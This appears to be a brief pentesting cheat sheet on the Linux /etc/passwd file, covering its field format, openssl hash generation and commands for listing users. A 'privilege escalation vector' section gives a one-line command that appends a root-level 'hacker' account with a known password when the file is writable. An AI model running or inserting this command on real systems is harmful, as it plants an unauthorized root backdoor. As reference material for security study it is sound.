# /etc/passwd user account database because system needs users.

## format
```
username:password:uid:gid:gecos:home:shell
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:User Name:/home/user:/bin/bash
```

## fields
- `username`: login name
- `password`: `x` (shadow) or hash
- `uid`: user ID (0=root)
- `gid`: primary group ID  
- `gecos`: full name/description
- `home`: home directory path
- `shell`: login shell

## generate password hash
```bash
openssl passwd -1 -salt mysalt mypassword    # MD5 hash
openssl passwd -6 -salt mysalt mypassword    # SHA-512 hash (better)
```

## analysis
```bash
cat /etc/passwd                          # view all users
grep "bash" /etc/passwd                  # users with bash shell
awk -F: '$3 >= 1000 {print $1}' /etc/passwd    # regular users (uid >= 1000)
awk -F: '$3 == 0 {print $1}' /etc/passwd       # root users (uid = 0)
```

## privilege escalation vector
if writable:
```bash
echo "hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
```

## notes
[!] `x` in password field means shadow passwords enabled
[!] uid 0 = root privileges regardless of username
[!] writable /etc/passwd = instant root access